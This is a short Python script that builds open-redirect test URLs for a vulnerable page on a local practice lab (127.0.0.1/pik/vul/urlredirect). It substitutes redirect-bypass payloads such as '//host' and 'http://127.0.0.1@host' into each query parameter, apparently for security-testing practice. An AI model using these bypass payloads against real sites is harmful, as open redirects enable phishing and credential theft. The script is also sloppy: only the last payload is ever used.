# -*- coding:utf-8 -*-
#__author__:langzi
#__blog__:www.langzi.fun
import requests
from urllib.parse import urlencode,urlparse,urljoin,urlsplit

payload = ['http://127.0.0.1@www.langzi.fun']
payload = ['http://www.langzi.fun']
payload = ['//www.langzi.fun']
payload = ['http://127.0.0.1#www.langzi.fun']

url = 'http://127.0.0.1/pik/vul/urlredirect/urlredirect.php?url=i&id=1'
res = urlparse(url)
#print(res.query)
if '&' in res.query:
    querys = [x for x in res.query.split('&')]
    #print(querys)

for i in querys:
    vlun_url = (res.scheme+'://'+res.netloc+res.path+'?'+res.query.replace(i,i.split('=')[0]+'='+payload[0]))
    print(vlun_url)